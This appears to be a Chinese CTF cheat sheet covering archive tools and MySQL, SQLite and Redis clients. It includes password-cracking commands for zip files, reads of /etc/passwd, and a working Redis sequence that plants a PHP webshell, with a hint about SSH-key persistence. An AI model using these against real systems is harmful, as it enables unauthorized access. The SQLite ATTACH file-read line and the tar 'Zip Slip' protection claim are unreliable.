### [tar-zip] 打包解压与加密 | easy | tar;zip;压缩;加密 | 解压
> 拿到压缩包先看结构再解，tar/zip/gzip 的常见参数与加密压缩包的处理是高频操作。

```bash
tar czf out.tar.gz dir/           # 打包并 gzip 压缩（c 创建 z gzip f 文件）
tar xzf out.tar.gz                # 解压
tar xzf out.tar.gz -C /tmp/       # 解压到指定目录
tar tvf out.tar.gz                # 只列内容不展开（-t 预览，先看有没有坑）
tar xf out.tar.gz --transform='s|^|/safe/|'   # 防 Zip Slip 类路径逃逸（可选）

zip -r out.zip dir/               # 打包
zip -P secret123 out.zip file     # 加密压缩（-P 明文口令）
unzip out.zip                     # 解压
unzip -P secret123 out.zip        # 带口令解压
unzip -l out.zip                  # 只列内容
zip2john out.zip > hash.txt; john hash.txt   # 爆破加密 zip 口令（John the Ripper）
fcrackzip -u -D -p dict.txt out.zip          # 字典爆破 zip

gzip -d file.gz                   # 解 gzip
gunzip file.gz
bzip2 -d file.bz2
xz -d file.xz
7z x archive.7z                   # 7z（-p 带口令）
rar x archive.rar                 # rar（rar2john + john 爆破口令）
file archive.ext                  # 先识别真实格式！改名不改格式
binwalk archive                    # 看内部是否嵌套文件
# 加密通用：openssl 对称加密
openssl enc -aes-256-cbc -salt -in flag.txt -out flag.enc -k PASSWORD
openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k PASSWORD
```

> [!tip] 拿到未知格式先 `file`，再 `binwalk`；解密题先看 16 进制头（`xxd file | head`）判断是 zip/rar/7z/openssl 哪一路，再决定爆破还是找口令。

### [db-clients] 数据库客户端常用操作 | medium | mysql;sqlite3;redis;数据库 | 查库
> 内网/容器里最常见的三种库：MySQL、SQLite（单文件最爱藏 flag）、Redis（未授权常客），一条命令进库逐行翻。

```bash
# MySQL
mysql -h 127.0.0.1 -u root -p               # 交互式（-p 后回车再输密码）
mysql -h host -u root -p'pass' -e "SELECT user,host FROM mysql.user;"
mysql -u root -p'pass' ctf_db -e "SHOW TABLES;"
mysql -u root -e "SELECT * FROM ctf_db.flag;"
mysql -u root -e "SELECT LOAD_FILE('/etc/passwd');"    # 读文件（FILE 权限）
mysql -u root -e "SELECT @@secure_file_priv, @@version, @@basedir;"   # 看版本与写权限

# SQLite（独立 .db/.sqlite 文件）
sqlite3 flag.db '.tables'                # 列表
sqlite3 flag.db '.schema'                # 看建表语句
sqlite3 flag.db 'SELECT * FROM flag;'
sqlite3 flag.db '.dump'                  # 全量导出（含数据）
sqlite3 flag.db 'ATTACH "/etc/passwd" AS p; SELECT * FROM p.passwd;'   # 利用 attach 读文件

# Redis（未授权常见）
redis-cli -h 127.0.0.1 -p 6379 ping      # PONG 即未授权可进
redis-cli INFO | grep -i version
redis-cli KEYS '*'                       # 看所有 key
redis-cli GET flag
redis-cli -n 0 DBSIZE
# 利用未授权写 webshell（绝对路径可写为前提）
redis-cli -h target SET k "<?php system(\$_GET['c']);?>"
redis-cli -h target CONFIG SET dir /var/www/html
redis-cli -h target CONFIG SET dbfilename s.php
redis-cli -h target SAVE
# 或写 SSH 公钥 /root/.ssh/authorized_keys 做持久化
```

> [!tip] SQLite 文件常在题目目录里 `find / -name '*.db' -o -name '*.sqlite*'` 直接捡到；Redis 未授权先 `KEYS *` 再 `GET`。MySQL 的 `LOAD_FILE` 需要 FILE 权限且 secure_file_priv 不为 NULL。
> [!warn] Redis `CONFIG SET dir` 写文件要求 web 目录可写；失败时检查 `INFO` 里的 `# Server` 与容器挂载情况，别盲目重复打。